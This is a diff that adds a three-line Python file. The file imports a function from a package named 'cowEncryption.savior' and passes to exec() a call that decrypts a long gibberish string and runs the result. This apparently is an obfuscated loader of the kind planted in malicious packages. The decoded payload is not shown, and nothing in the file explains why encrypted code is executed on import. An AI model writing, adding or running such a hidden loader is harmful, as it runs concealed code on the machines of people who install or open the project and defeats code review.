@@ -1,0 +1,3 @@
+from cowEncryption.savior import Running
+
+exec("Running('HDqnakdnaHqhdasjdkcdsawwqdasdaIdnwqiPWqdbwbqndq10nkanksdsainvis02nksdnvsjdsajbdjsahhcxxfgxv7767ycv7767yc(hwdqndaKfskfinin2891313bOD(QJdsna(hwdqndaKHqhdasjdkcv7767ychdakshdq31ncwojdwinvis02nksdnvs51nicnaksnknec', 'running').decPrem('running')")
